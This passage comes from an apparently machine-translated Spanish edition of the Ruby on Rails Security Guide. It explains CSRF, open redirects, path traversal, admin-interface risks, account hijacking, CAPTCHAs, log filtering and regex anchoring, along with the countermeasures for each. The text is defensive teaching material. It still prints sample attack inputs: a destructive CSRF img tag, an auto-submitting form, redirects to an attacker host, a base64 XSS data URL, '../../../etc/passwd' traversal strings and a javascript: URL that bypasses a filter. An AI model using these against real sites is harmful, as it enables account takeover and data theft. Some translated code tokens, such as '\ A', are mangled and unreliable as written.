<li>Bob busca en un tablero de mensajes y ve una publicación de un hacker donde hay un elemento de imagen HTML diseñado. El elemento hace referencia a un comando en la aplicación de gestión de proyectos de Bob, en lugar de un archivo de imagen: <code>&lt;img src="http://www.webapp.com/project/1/destroy"&gt;</code>
</li>
<li>La sesión de Bob en <code>www.webapp.com</code> todavía está viva, porque no se desconectó hace unos minutos.</li>
<li>Al ver la publicación, el navegador encuentra una etiqueta de imagen. Intenta cargar la imagen sospechosa de <code>www.webapp.com</code>. Como se explicó anteriormente, también enviará la cookie con el ID de sesión válido.</li>
<li>La aplicación web en <code>www.webapp.com</code> verifica la información del usuario en el hash de sesión correspondiente y destruye el proyecto con el ID 1. Luego devuelve una página de resultados que es un resultado inesperado para el navegador, por lo que no se mostrará la imagen.</li>
<li>Bob no se da cuenta del ataque, pero unos días después se entera de que el proyecto número uno se ha ido.</li>
</ul>
<p>Es importante tener en cuenta que la imagen o el enlace creados reales no necesariamente tienen que estar ubicados en el dominio de la aplicación web, pueden estar en cualquier lugar: en un foro, publicación de blog o correo electrónico.</p><p>CSRF aparece muy raramente en CVE (Vulnerabilidades y Exposiciones Comunes) - menos del 0.1% en 2006 - pero realmente es un 'gigante dormido' [Grossman]. Esto está en marcado contraste con los resultados en muchos trabajos de contratos de seguridad: <em>CSRF es un problema de seguridad importante</em>.</p><h4 id="csrf-countermeasures"><a class="anchorlink" href="#csrf-countermeasures">3.1 CSRF Countermeasures</a></h4><div class="note"><p><em>Primero, como lo requiere el W3C, use GET y POST apropiadamente. En segundo lugar, un token de seguridad en solicitudes que no sean GET protegerá su aplicación de CSRF.</em></p></div><p>El protocolo HTTP básicamente proporciona dos tipos principales de solicitudes: GET y POST (DELETE, PUT y PATCH deben usarse como POST). El Consorcio World Wide Web (W3C) proporciona una lista de verificación para elegir HTTP GET o POST:</p><p><strong>Use GET si:</strong></p>
<ul>
<li>La interacción es más <em>como una pregunta</em> (es decir, es una operación segura como una consulta, una operación de lectura o una búsqueda).</li>
</ul>
<p><strong>Use POST si:</strong></p>
<ul>
<li>La interacción es más <em>como una orden</em>, o</li>
<li>La interacción <em>cambia el estado</em> del recurso de una manera que el usuario percibiría (por ejemplo, una suscripción a un servicio), o</li>
<li>El usuario es <em>responsable de los resultados</em> de la interacción.</li>
</ul>
<p>Si su aplicación web es RESTful, es posible que esté acostumbrado a verbos HTTP adicionales, como PATCH, PUT o DELETE. Sin embargo, algunos navegadores web heredados no los admiten, solo GET y POST. Rails usa un campo <code>_method</code> oculto para manejar estos casos.</p><p><em>Las solicitudes POST también se pueden enviar automáticamente</em>. En este ejemplo, el enlace <a href="http://www.harmless.com">www.harmless.com</a> se muestra como destino en la barra de estado del navegador. Pero en realidad ha creado dinámicamente un nuevo formulario que envía una solicitud POST.</p><div class="code_container">
<pre><code class="language-xml">&lt;a href="http://www.harmless.com/" onclick="
  var f = document.createElement('form');
  f.style.display = 'none';
  this.parentNode.appendChild(f);
  f.method = 'POST';
  f.action = 'http://www.example.com/account/destroy';
  f.submit();
  return false;"&gt;To the harmless survey&lt;/a&gt;
</code></pre>
</div>
<p>O el atacante coloca el código en el controlador de eventos onmouseover de una imagen:</p><div class="code_container">
<pre><code class="language-xml">&lt;img src="http://www.harmless.com/img" width="400" height="400" onmouseover="..." /&gt;
</code></pre>
</div>
<p>Hay muchas otras posibilidades, como usar una etiqueta <code>&lt;script&gt;</code> para realizar una solicitud entre sitios a una URL con una respuesta JSONP o JavaScript. La respuesta es un código ejecutable que el atacante puede encontrar una forma de ejecutar, posiblemente extrayendo datos confidenciales. Para protegernos contra esta fuga de datos, debemos rechazar las etiquetas <code>&lt;script&gt;</code> entre sitios. Sin embargo, las solicitudes de Ajax obedecen la política del mismo origen del navegador (solo su propio sitio puede iniciar <code>XmlHttpRequest</code>) para que podamos permitirles de forma segura que devuelvan respuestas de JavaScript.</p><div class="note"><p>No podemos distinguir el origen de una etiqueta <code>&lt;script&gt;</code>, ya sea una etiqueta en su propio sitio o en algún otro sitio malicioso, por lo que debemos bloquear todos los <code>&lt;script&gt;</code> en todos los ámbitos, incluso si en realidad es un script seguro del mismo origen servido desde su propio sitio. En estos casos, omita explícitamente la protección CSRF en acciones que sirvan JavaScript para una etiqueta <code>&lt;script&gt;</code>.</p></div><p>Para protegernos contra todas las demás solicitudes falsificadas, presentamos un <em>token de seguridad requerido</em> que nuestro sitio conoce pero que otros sitios no conocen. Incluimos el token de seguridad en las solicitudes y lo verificamos en el servidor. Esta es una línea en el controlador de su aplicación y es la predeterminada para las aplicaciones Rails recién creadas:</p><div class="code_container">
<pre><code class="language-ruby">protect_from_forgery with: :exception
</code></pre>
</div>
<p>Esto incluirá automáticamente un token de seguridad en todos los formularios y solicitudes Ajax generadas por Rails. Si el token de seguridad no coincide con lo esperado, se lanzará una excepción.</p><div class="note"><p>De forma predeterminada, Rails incluye un <a href="https://github.com/rails/rails/blob/master/actionview/app/assets/javascripts">unobtrusive scripting adapter</a>,
que agrega un encabezado llamado <code>X-CSRF-Token</code> con el token de seguridad en cada no GET
Llamada Ajax. Sin este encabezado, Rails no aceptará solicitudes de Ajax que no sean GET.
Cuando se usa otra biblioteca para realizar llamadas Ajax, es necesario agregar la seguridad de
token como encabezado predeterminado para las llamadas Ajax en su biblioteca. Para obtener el token, tenga
una mirada a la etiqueta <code>&lt;meta name='csrf-token' content='THE-TOKEN'&gt;</code> impresa por
<code>&lt;%= csrf_meta_tags %&gt;</code> en la vista de su aplicación.</p></div><p>Es común usar cookies persistentes para almacenar información del usuario, con <code>cookies.permanent</code> por ejemplo. En este caso, las cookies no se borrarán y la protección CSRF lista para usar no será efectiva. Si está utilizando una tienda de cookies diferente a la sesión para esta información, debe manejar qué hacer con ella usted mismo:</p><div class="code_container">
<pre><code class="language-ruby">rescue_from ActionController::InvalidAuthenticityToken do |exception|
  sign_out_user # Example method that will destroy the user cookies
end
</code></pre>
</div>
<p>El método anterior se puede colocar en el <code>ApplicationController</code> y se llamará cuando un token CSRF no esté presente o sea incorrecto en una solicitud que no sea GET.</p><p>Tenga en cuenta que las vulnerabilidades de <em>cross-site scripting (XSS) eluden todas las protecciones CSRF</em>. XSS le da al atacante acceso a todos los elementos de una página, para que pueda leer el token de seguridad CSRF de un formulario o enviarlo directamente. Lea <a href="#cross-site-scripting-xss">more about XSS</a> más adelante.</p><h3 id="redirection-and-files"><a class="anchorlink" href="#redirection-and-files">4 Redirection and Files</a></h3><p>Otra clase de vulnerabilidades de seguridad rodea el uso de redireccionamiento y archivos en aplicaciones web.</p><h4 id="redirection"><a class="anchorlink" href="#redirection">4.1 Redirection</a></h4><p>ADVERTENCIA: _La redirección en una aplicación web es una herramienta de cracker subestimada: el atacante no solo puede reenviar al usuario a un sitio web trampa, sino que también puede crear un ataque autónomo.</p><p>Siempre que se le permita al usuario pasar (partes de) la URL para la redirección, posiblemente sea vulnerable. El ataque más obvio sería redirigir a los usuarios a una aplicación web falsa que se ve y se siente exactamente como la original. Este llamado ataque de phishing funciona enviando un enlace no sospechoso en un correo electrónico a los usuarios, inyectando el enlace por XSS en la aplicación web o colocando el enlace en un sitio externo. No es sospechoso, porque el enlace comienza con la URL de la aplicación web y la URL del sitio malicioso está oculta en el parámetro de redirección: <a href="http://www.example.com/site/redirect?to=www.attacker.com">http://www.example.com/site/redirect?to=www.attacker.com</a> . A continuación, se muestra un ejemplo de una acción heredada:</p><div class="code_container">
<pre><code class="language-ruby">def legacy
  redirect_to(params.update(action:'main'))
end
</code></pre>
</div>
<p>Esto redirigirá al usuario a la acción principal si intentaron acceder a una acción heredada. La intención era conservar los parámetros de URL de la acción heredada y pasarlos a la acción principal. Sin embargo, el atacante puede aprovecharlo si incluye una clave de host en la URL:</p><div class="code_container">
<pre><code class="language-plain">http://www.example.com/site/legacy?param1=xy&amp;param2=23&amp;host=www.attacker.com
</code></pre>
</div>
<p>Si está al final de la URL, apenas se notará y redirige al usuario al host de attacker.com. Una contramedida simple sería <em>incluir solo los parámetros esperados en una acción heredada</em> (nuevamente, un enfoque de lista permitido, en lugar de eliminar parámetros inesperados). <em>Y si redirige a una URL, compruébalo con una lista permitida o una expresión regular</em>.</p><h5 id="self-contained-xss"><a class="anchorlink" href="#self-contained-xss">4.1.1 Self-contained XSS</a></h5><p>Otro ataque de redirección y XSS autónomo funciona en Firefox y Opera mediante el uso del protocolo de datos. Este protocolo muestra su contenido directamente en el navegador y puede ser cualquier cosa, desde HTML o JavaScript hasta imágenes completas:</p><p><code>data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K</code></p><p>Este ejemplo es un JavaScript codificado en Base64 que muestra un cuadro de mensaje simple. En una URL de redirección, un atacante podría redirigir a esta URL con el código malicioso en ella. Como contramedida, <em>no permita que el usuario proporcione (partes de) la URL a la que será redirigido</em>.</p><h4 id="file-uploads"><a class="anchorlink" href="#file-uploads">4.2 File Uploads</a></h4><p>NOTA: _Asegúrese de que las cargas de archivos no sobrescriban los archivos importantes y procese los archivos multimedia de forma asincrónica.</p><p>Muchas aplicaciones web permiten a los usuarios cargar archivos. <em>Los nombres de archivo, que el usuario puede elegir (en parte), siempre deben filtrarse</em> ya que un atacante podría usar un nombre de archivo malicioso para sobrescribir cualquier archivo en el servidor. Si almacena cargas de archivos en / var / www / uploads, y el usuario ingresa un nombre de archivo como "../../../etc/passwd", puede sobrescribir un archivo importante. Por supuesto, el intérprete de Ruby necesitaría los permisos adecuados para hacerlo, una razón más para ejecutar servidores web, servidores de bases de datos y otros programas como un usuario Unix con menos privilegios.</p><p>Al filtrar los nombres de los archivos de entrada del usuario, <em>no intente eliminar partes maliciosas</em>. Piense en una situación en la que la aplicación web elimina todo "../" en un nombre de archivo y un atacante usa una cadena como ".... //" - el resultado será "../". Es mejor utilizar un enfoque de lista permitida, que <em>comprueba la validez de un nombre de archivo con un conjunto de caracteres aceptados</em>. Esto se opone a un enfoque de lista restringida que intenta eliminar los caracteres no permitidos. En caso de que no sea un nombre de archivo válido, rechácelo (o reemplace los caracteres no aceptados), pero no los elimine. Aquí está el desinfectante de nombre de archivo del  <a href="https://github.com/technoweenie/attachment_fu/tree/master">attachment_fu plugin</a>:</p><div class="code_container">
<pre><code class="language-ruby">def sanitize_filename(filename)
  filename.strip.tap do |name|
    # NOTE: File.basename doesn't work right with Windows paths on Unix
    # get only the filename, not the whole path
    name.sub! /\A.*(\\|\/)/, ''
    # Finally, replace all non alphanumeric, underscore
    # or periods with underscore
    name.gsub! /[^\w\.\-]/, '_'
  end
end
</code></pre>
</div>
<p>Una desventaja significativa del procesamiento síncrono de cargas de archivos (como el complemento attach_fu puede hacer con las imágenes) es su <em>vulnerabilidad a los ataques de denegación de servicio</em>. Un atacante puede iniciar de forma síncrona la carga de archivos de imagen desde muchas computadoras, lo que aumenta la carga del servidor y, finalmente, puede bloquear o detener el servidor.</p><p>La mejor solución para esto es <em>procesar archivos multimedia de forma asincrónica</em>: guarde el archivo multimedia y programe una solicitud de procesamiento en la base de datos. Un segundo proceso se encargará del procesamiento del archivo en segundo plano.</p><h4 id="executable-code-in-file-uploads"><a class="anchorlink" href="#executable-code-in-file-uploads">4.3 Executable Code in File Uploads</a></h4><div class="warning"><p><em>El código fuente de los archivos cargados puede ejecutarse cuando se coloca en directorios específicos. No coloque cargas de archivos en el directorio/public de Rails si es el directorio de inicio de Apache.</em></p></div><p>El popular servidor web Apache tiene una opción llamada DocumentRoot. Este es el directorio de inicio del sitio web, todo en este árbol de directorios será servido por el servidor web. Si hay archivos con una determinada extensión de nombre de archivo, el código que contiene se ejecutará cuando se solicite (puede requerir que se establezcan algunas opciones). Ejemplos de esto son archivos PHP y CGI. Ahora piense en una situación en la que un atacante carga un archivo "file.cgi" con código, que se ejecutará cuando alguien descargue el archivo.</p><p><em>Si su Apache DocumentRoot apunta al directorio/public de Rails, no coloque cargas de archivos en él</em>, almacene los archivos al menos un nivel hacia arriba.</p><h4 id="file-downloads"><a class="anchorlink" href="#file-downloads">4.4 File Downloads</a></h4><div class="note"><p><em>Asegúrese de que los usuarios no puedan descargar archivos arbitrarios</em></p></div><p>Del mismo modo que debe filtrar los nombres de los archivos para las cargas, debe hacerlo para las descargas. El método <code>send_file()</code> envía archivos desde el servidor al cliente. Si utiliza un nombre de archivo, que el usuario ingresó, sin filtrar, se puede descargar cualquier archivo:</p><div class="code_container">
<pre><code class="language-ruby">send_file('/var/www/uploads/' + params[:filename])
</code></pre>
</div>
<p>Simplemente pase un nombre de archivo como "../../../etc/passwd" para descargar la información de inicio de sesión del servidor. Una solución simple contra esto es <em>comprobar que el archivo solicitado esté en el directorio esperado</em>:</p><div class="code_container">
<pre><code class="language-ruby">basename = File.expand_path('../../files', __dir__)
filename = File.expand_path(File.join(basename, @file.public_filename))
raise if basename !=
     File.expand_path(File.join(File.dirname(filename), '../../../'))
send_file filename, disposition: 'inline'
</code></pre>
</div>
<p>Otro enfoque (adicional) es almacenar los nombres de los archivos en la base de datos y nombrar los archivos en el disco después de los identificadores de la base de datos. Este también es un buen enfoque para evitar la posible ejecución de código en un archivo cargado. El complemento attach_fu hace esto de manera similar.</p><h3 id="intranet-and-admin-security"><a class="anchorlink" href="#intranet-and-admin-security">5 Intranet and Admin Security</a></h3><p>Las interfaces de administración e intranet son objetivos de ataque populares porque permiten el acceso privilegiado. Aunque esto requeriría varias medidas de seguridad adicionales, en el mundo real ocurre lo contrario.</p><p>En 2007, apareció el primer troyano hecho a medida que robó información de una intranet, a saber, el sitio web "Monster para empleadores" de Monster.com, una aplicación web de contratación en línea. Los troyanos hechos a medida son muy raros, hasta ahora, y el riesgo es bastante bajo, pero ciertamente es una posibilidad y un ejemplo de cómo la seguridad del host del cliente también es importante. Sin embargo, la mayor amenaza para las aplicaciones de administración e intranet son XSS y CSRF.</p><p><strong>XSS</strong> Si su aplicación vuelve a mostrar la entrada de un usuario malintencionado desde la extranet, la aplicación será vulnerable a XSS. Nombres de usuario, comentarios, informes de spam, direcciones de pedidos son solo algunos ejemplos poco comunes, donde puede haber XSS.</p><p>Tener un solo lugar en la interfaz de administración o Intranet, donde la entrada no se ha desinfectado, hace que toda la aplicación sea vulnerable. Las posibles vulnerabilidades incluyen el robo de la cookie del administrador privilegiado, la inyección de un iframe para robar la contraseña del administrador o la instalación de software malicioso a través de los agujeros de seguridad del navegador para hacerse cargo de la computadora del administrador.</p><p>Consulte la sección de Inyección para conocer las contramedidas contra XSS.</p><p><strong>CSRF</strong> Falsificación de solicitudes entre sitios (CSRF), también conocida como Falsificación de referencias entre sitios (XSRF), es un método de ataque gigantesco que permite al atacante hacer todo lo que el administrador o el usuario de la intranet puede hacer. Como ya ha visto anteriormente cómo funciona CSRF, aquí hay algunos ejemplos de lo que los atacantes pueden hacer en la intranet o la interfaz de administración.</p><p>Un ejemplo del mundo real es un <a href="http://www.h-online.com/security/news/item/Symantec-reports-first-active-attack-on-a-DSL-router-735883.html">router reconfiguration by CSRF</a>. Los atacantes enviaron un correo electrónico malicioso, con CSRF, a los usuarios mexicanos. El correo electrónico afirmó que había una tarjeta electrónica esperando al usuario, pero también contenía una etiqueta de imagen que resultó en una solicitud HTTP-GET para reconfigurar el enrutador del usuario (que es un modelo popular en México). La solicitud cambió la configuración de DNS para que las solicitudes a un sitio bancario con sede en México se asignaran al sitio del atacante. Todos los que accedieron al sitio bancario a través de ese enrutador vieron el sitio web falso del atacante y les robaron sus credenciales.</p><p>Otro ejemplo cambió la dirección de correo electrónico y la contraseña de Google Adsense. Si la víctima inició sesión en Google Adsense, la interfaz de administración de las campañas publicitarias de Google, un atacante podría cambiar las credenciales de la víctima.</p><p>Otro ataque popular es enviar spam a su aplicación web, blog o foro para propagar XSS malicioso. Por supuesto, el atacante debe conocer la estructura de la URL, pero la mayoría de las URL de Rails son bastante sencillas o serán fáciles de averiguar, si se trata de la interfaz de administración de una aplicación de código abierto. El atacante puede incluso hacer 1.000 intentos de suerte con solo incluir etiquetas IMG maliciosas que prueban todas las combinaciones posibles.</p><p>Para <em>contramedidas contra CSRF en interfaces de administración y aplicaciones de Intranet, consulte las contramedidas en la sección CSRF</em>.</p><h4 id="additional-precautions"><a class="anchorlink" href="#additional-precautions">5.1 Additional Precautions</a></h4><p>La interfaz de administración común funciona así: se encuentra en <a href="http://www.example.com/admin">www.example.com/admin</a>, solo se puede acceder a ella si la marca de administrador está configurada en el modelo de usuario, vuelve a mostrar la entrada del usuario y permite al administrador eliminar/agregar/editar lo que sea datos deseados. Aquí hay algunas ideas sobre esto:</p>
<ul>
<li><p>Es muy importante <em>pensar en el peor de los casos</em>: ¿Qué pasa si alguien realmente se apodera de sus cookies o credenciales de usuario? Podría <em>introducir roles</em> para la interfaz de administración para limitar las posibilidades del atacante. O qué tal las <em>credenciales de inicio de sesión especiales</em> para la interfaz de administración, distintas de las que se utilizan para la parte pública de la aplicación. ¿O una <em>contraseña especial para acciones muy graves</em>?</p></li>
<li><p>¿El administrador realmente tiene que acceder a la interfaz desde cualquier lugar del mundo? Piense en <em>limitar el inicio de sesión a un grupo de direcciones IP de origen</em>. Examine request.remote_ip para conocer la dirección IP del usuario. Esto no es a prueba de balas, sino una gran barrera. Sin embargo, recuerde que podría haber un proxy en uso.</p></li>
<li><p><em>Ponga la interfaz de administración en un subdominio especial</em> como admin.application.com y conviértalo en una aplicación separada con su propia administración de usuarios. Esto hace que robar una cookie de administrador del dominio habitual, <a href="http://www.application.com">www.application.com</a>, sea imposible. Esto se debe a la misma política de origen en su navegador: una secuencia de comandos inyectada (XSS) en <a href="http://www.application.com">www.application.com</a> puede no leer la cookie para admin.application.com y viceversa.</p></li>
</ul>
<h3 id="user-management"><a class="anchorlink" href="#user-management">6 User Management</a></h3><div class="note"><p>_Casi todas las aplicaciones web tienen que lidiar con la autorización y la autenticación. En lugar de lanzar el suyo propio, es recomendable utilizar complementos comunes. Pero manténgalos actualizados también. Algunas precauciones adicionales pueden hacer que su aplicación sea aún más segura.</p></div><p>Hay varios complementos de autenticación disponibles para Rails. Buenos, como los populares <a href="https://github.com/plataformatec/devise">devise</a> y <a href="https://github.com/binarylogic/authlogic">authlogic</a>, almacene solo contraseñas cifradas, no contraseñas de texto sin formato. En Rails 3.1 puedes usar el método incorporado <code>has_secure_password</code> que tiene características similares.</p><p>Cada nuevo usuario recibe un código de activación para activar su cuenta cuando recibe un correo electrónico con un enlace. Después de activar la cuenta, las columnas de código de activación se establecerán en NULL en la base de datos. Si alguien solicita una URL como esta, iniciará sesión como el primer usuario activado encontrado en la base de datos (y es probable que este sea el administrador):</p><div class="code_container">
<pre><code class="language-plain">http://localhost:3006/user/activate
http://localhost:3006/user/activate?id=
</code></pre>
</div>
<p>Esto es posible porque en algunos servidores, de esta manera el parámetro id, como en params[:id], sería nulo. Sin embargo, aquí está el buscador de la acción de activación:</p><div class="code_container">
<pre><code class="language-ruby">User.find_by_activation_code(params[:id])
</code></pre>
</div>
<p>Si el parámetro era nulo, la consulta SQL resultante será</p><div class="code_container">
<pre><code class="language-sql">SELECT * FROM users WHERE (users.activation_code IS NULL) LIMIT 1
</code></pre>
</div>
<p>Y así encontró al primer usuario en la base de datos, lo devolvió e inició sesión. Puede obtener más información al respecto en <a href="http://www.rorsecurity.info/2007/10/28/restful_authentication-login-security/">esta publicación de blog</a>. <em>Es recomendable actualizar sus complementos de vez en cuando</em>. Además, puede revisar su aplicación para encontrar más fallas como esta.</p><h4 id="brute-forcing-accounts"><a class="anchorlink" href="#brute-forcing-accounts">6.1 Brute-Forcing Accounts</a></h4><div class="note"><p><em>Los ataques de fuerza bruta a las cuentas son ataques de prueba y error a las credenciales de inicio de sesión. Defiéndalos con mensajes de error más genéricos y posiblemente requiera ingresar un CAPTCHA.</em></p></div><p>Una lista de nombres de usuario para su aplicación web puede ser mal utilizada para forzar las contraseñas correspondientes, porque la mayoría de la gente no usa contraseñas sofisticadas. La mayoría de las contraseñas son una combinación de palabras del diccionario y posiblemente números. Por lo tanto, armado con una lista de nombres de usuario y un diccionario, un programa automático puede encontrar la contraseña correcta en cuestión de minutos.</p><p>Debido a esto, la mayoría de las aplicaciones web mostrarán un mensaje de error genérico "el nombre de usuario o la contraseña no son correctos", si alguno de estos no es correcto. Si decía "el nombre de usuario que ingresó no se ha encontrado", un atacante podría compilar automáticamente una lista de nombres de usuario.</p><p>Sin embargo, lo que la mayoría de los diseñadores de aplicaciones web descuidan son las páginas de contraseña olvidada. Estas páginas a menudo admiten que el nombre de usuario o la dirección de correo electrónico ingresados ​​no se han encontrado. Esto permite a un atacante compilar una lista de nombres de usuario y aplicar la fuerza bruta a las cuentas.</p><p>Para mitigar estos ataques, <em>muestre también un mensaje de error genérico en las páginas de contraseña olvidada</em>. Además, puede <em>requitar ingresar un CAPTCHA después de varios inicios de sesión fallidos desde una determinada dirección IP</em>. Sin embargo, tenga en cuenta que esta no es una solución a prueba de balas contra los programas automáticos, porque estos programas pueden cambiar su dirección IP con la misma frecuencia. Sin embargo, eleva la barrera de un ataque.</p><h4 id="account-hijacking"><a class="anchorlink" href="#account-hijacking">6.2 Account Hijacking</a></h4><p>Muchas aplicaciones web facilitan el secuestro de cuentas de usuario. ¿Por qué no ser diferente y hacerlo más difícil ?.</p><h5 id="passwords"><a class="anchorlink" href="#passwords">6.2.1 Passwords</a></h5><p>Piense en una situación en la que un atacante ha robado la cookie de sesión de un usuario y, por lo tanto, puede utilizar la aplicación de forma conjunta. Si es fácil cambiar la contraseña, el atacante secuestrará la cuenta con unos pocos clics. O si el formulario de cambio de contraseña es vulnerable a CSRF, el atacante podrá cambiar la contraseña de la víctima atrayéndola a una página web donde hay una etiqueta IMG diseñada que hace el CSRF. Como contramedida, <em>hacer que los formularios de cambio de contraseña sean seguros contra CSRF</em>, por supuesto. Y <em>require al usuario que ingrese la contraseña anterior cuando la cambie</em>.</p><h5 id="e-mail"><a class="anchorlink" href="#e-mail">6.2.2 E-Mail</a></h5><p>Sin embargo, el atacante también puede apoderarse de la cuenta cambiando la dirección de correo electrónico. Después de que la cambien, irán a la página de contraseña olvidada y la (posiblemente nueva) contraseña se enviará por correo a la dirección de correo electrónico del atacante. Como contramedida <em>requiere que el usuario ingrese la contraseña cuando cambie la dirección de correo electrónico también</em>.</p><h5 id="other"><a class="anchorlink" href="#other">6.2.3 Other</a></h5><p>Dependiendo de su aplicación web, puede haber más formas de secuestrar la cuenta del usuario. En muchos casos, CSRF y XSS ayudarán a hacerlo. Por ejemplo, como en una vulnerabilidad CSRF en <a href="https://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/">Google Mail</a>. En este ataque de prueba de concepto, la víctima habría sido atraída a un sitio web controlado por el atacante. En ese sitio hay una etiqueta IMG diseñada que da como resultado una solicitud HTTP GET que cambia la configuración del filtro de Google Mail. Si la víctima inició sesión en Google Mail, el atacante cambiaría los filtros para reenviar todos los correos electrónicos a su dirección de correo electrónico. Esto es casi tan dañino como secuestrar toda la cuenta. Como contramedida, <em>revise la lógica de su aplicación y elimine todas las vulnerabilidades XSS y CSRF</em>.</p><h4 id="captchas"><a class="anchorlink" href="#captchas">6.3 CAPTCHAs</a></h4><div class="info"><p><em>A CAPTCHA es una prueba de desafío-respuesta para determinar que la respuesta no es generada por una computadora. A menudo se utiliza para proteger los formularios de registro de los atacantes y los formularios de comentarios de los robots de spam automáticos pidiendo al usuario que escriba las letras de una imagen distorsionada. Este es el CAPTCHA positivo, pero también existe el CAPTCHA negativo. La idea de un CAPTCHA negativo no es que un usuario demuestre que es humano, sino que revele que un robot es un robot.</em></p></div><p>Una API CAPTCHA positiva popular es  <a href="https://developers.google.com/recaptcha/">reCAPTCHA</a> que muestra dos imágenes distorsionadas de palabras de libros antiguos. También agrega una línea en ángulo, en lugar de un fondo distorsionado y altos niveles de deformación en el texto como lo hicieron los CAPTCHA anteriores, porque estos últimos estaban rotos. Como beneficio adicional, el uso de reCAPTCHA ayuda a digitalizar libros antiguos.  <a href="https://github.com/ambethia/recaptcha/">ReCAPTCHA</a> is also a Rails plug-in with the same name as the API.</p><p>Obtendrá dos claves de la API, una pública y una privada, que debe poner en su entorno Rails. Después de eso, puede usar el método recaptcha_tags en la vista y el método verify_recaptcha en el controlador. Verify_recaptcha devolverá falso si falla la validación.
El problema con los CAPTCHA es que tienen un impacto negativo en la experiencia del usuario. Además, algunos usuarios con discapacidad visual han encontrado que ciertos tipos de CAPTCHA distorsionados son difíciles de leer. Aún así, los CAPTCHA positivos son uno de los mejores métodos para evitar que todo tipo de bots envíen formularios.</p><p>La mayoría de los bots son realmente tontos. Ellos rastrean la web y ponen su spam en todos los campos de formulario que pueden encontrar. Los CAPTCHA negativos se aprovechan de eso e incluyen un campo "honeypot" en el formulario que será ocultado al usuario humano por CSS o JavaScript.</p><p>Tenga en cuenta que los CAPTCHA negativos solo son efectivos contra bots tontos y no serán suficientes para proteger aplicaciones críticas de bots específicos. Aún así, los CAPTCHA negativos y positivos se pueden combinar para aumentar el rendimiento, por ejemplo, si el campo "honeypot" no está vacío (bot detectado), no necesitará verificar el CAPTCHA positivo, lo que requeriría una solicitud HTTPS a Google. ReCaptcha antes de calcular la respuesta.</p><p>Aquí hay algunas ideas sobre cómo ocultar campos de honeypot mediante JavaScript y / o CSS:</p>
<ul>
<li>colocar los campos fuera del área visible de la página</li>
<li>hacer los elementos muy pequeños o colorearlos igual que el fondo de la página</li>
<li>deje los campos mostrados, pero dígales a los humanos que los dejen en blanco</li>
</ul>
<p>El CAPTCHA negativo más simple es un campo de honeypot oculto. En el lado del servidor, comprobará el valor del campo: si contiene algún texto, debe ser un bot. Luego, puede ignorar la publicación o devolver un resultado positivo, pero no guardar la publicación en la base de datos. De esta manera, el bot estará satisfecho y seguirá adelante.</p><p>Puede encontrar CAPTCHA negativos más sofisticados en Ned Batchelder's <a href="https://nedbatchelder.com/text/stopbots.html">blog post</a>:</p>
<ul>
<li>Incluya un campo con la marca de tiempo UTC actual y compruébelo en el servidor. Si está demasiado lejos en el pasado o si está en el futuro, el formulario no es válido.</li>
<li>Aleatorizar los nombres de los campos</li>
<li>Incluya más de un campo de honeypot de todo tipo, incluidos los botones de envío</li>
</ul>
<p>Tenga en cuenta que esto lo protege solo de los bots automáticos, los bots personalizados específicos no pueden ser detenidos por esto. Por lo tanto, los <em>CAPTCHA negativos pueden no ser buenos para proteger los formularios de inicio de sesión</em>.</p><h4 id="logging"><a class="anchorlink" href="#logging">6.4 Logging</a></h4><div class="warning"><p><em>Dígale a Rails que no ponga contraseñas en los archivos de registro.</em></p></div><p>De forma predeterminada, Rails registra todas las solicitudes realizadas a la aplicación web. Pero los archivos de registro pueden ser un gran problema de seguridad, ya que pueden contener credenciales de inicio de sesión, números de tarjetas de crédito, etc. Al diseñar el concepto de seguridad de una aplicación web, también debe pensar en lo que sucederá si un atacante obtiene acceso (completo) al servidor web. Encriptar secretos y contraseñas en la base de datos será bastante inútil si los archivos de registro los enumeran en texto sin cifrar. Puede <em>filtrar ciertos parámetros de solicitud de sus archivos de registro</em> agregándolos a <code>config.filter_parameters</code> en la configuración de la aplicación. Estos parámetros se marcarán como [FILTRADOS] en el registro.</p><div class="code_container">
<pre><code class="language-ruby">config.filter_parameters &lt;&lt; :password
</code></pre>
</div>
<div class="note"><p>Los parámetros proporcionados se filtrarán mediante una expresión regular de coincidencia parcial. Rails agrega por defecto <code>: contraseña</code> en el inicializador apropiado (<code>initializers / filter_parameter_logging.rb</code>) y se preocupa por los parámetros típicos de la aplicación <code>password</code> y <code>password_confirmation</code>.</p></div><h4 id="regular-expressions"><a class="anchorlink" href="#regular-expressions">6.5 Regular Expressions</a></h4><div class="info"><p><em>Un error común en las expresiones regulares de Ruby es hacer coincidir el principio y el final de la cadena con ^ y $, en lugar de \ A y \ z.</em></p></div><p>Ruby usa un enfoque ligeramente diferente al de muchos otros lenguajes para hacer coincidir el final y el comienzo de una cadena. Es por eso que incluso muchos libros de Ruby y Rails se equivocan. Entonces, ¿cómo es esto una amenaza para la seguridad? Supongamos que desea validar libremente un campo de URL y utilizó una expresión regular simple como esta:</p><div class="code_container">
<pre><code class="language-ruby">  /^https?:\/\/[^\n]+$/i
</code></pre>
</div>
<p>Esto puede funcionar bien en algunos idiomas. Sin embargo, <em>en Ruby <code>^</code> y <code>$</code> coinciden con <strong>línea</strong> principio y final de línea</em>. Y así una URL como esta pasa el filtro sin problemas:</p><div class="code_container">
<pre><code class="language-plain">javascript:exploit_code();/*
http://hi.com
*/
</code></pre>
</div>
<p>Esta URL pasa el filtro porque la expresión regular coincide; la segunda línea, el resto no importa. Ahora imagina que tuviéramos una vista que mostrara la URL así:</p><div class="code_container">
<pre><code class="language-ruby">  link_to "Homepage", @user.homepage
</code></pre>
</div>
<p>El enlace parece inocente para los visitantes, pero cuando se hace clic en él, ejecutará la función de JavaScript "exploit_code" o cualquier otro JavaScript que proporcione el atacante.</p><p>Para corregir la expresión regular, se deben usar <code>\ A</code> y<code>\ z</code> en lugar de <code>^</code> y <code>$</code>, así:</p><div class="code_container">
<pre><code class="language-ruby">  /\Ahttps?:\/\/[^\n]+\z/i
</code></pre>
</div>
<p>Dado que este es un error frecuente, el validador de formato (validates_format_of) ahora genera una excepción si la expresión regular proporcionada comienza con ^ o termina con $. Si necesita usar ^ y $ en lugar de \ A y \ z (lo cual es raro), puede establecer la opción: multiline en true, así:</p><div class="code_container">
<pre><code class="language-ruby">  # content should include a line "Meanwhile" anywhere in the string
  validates :content, format: { with: /^Meanwhile$/, multiline: true }
</code></pre>
</div>
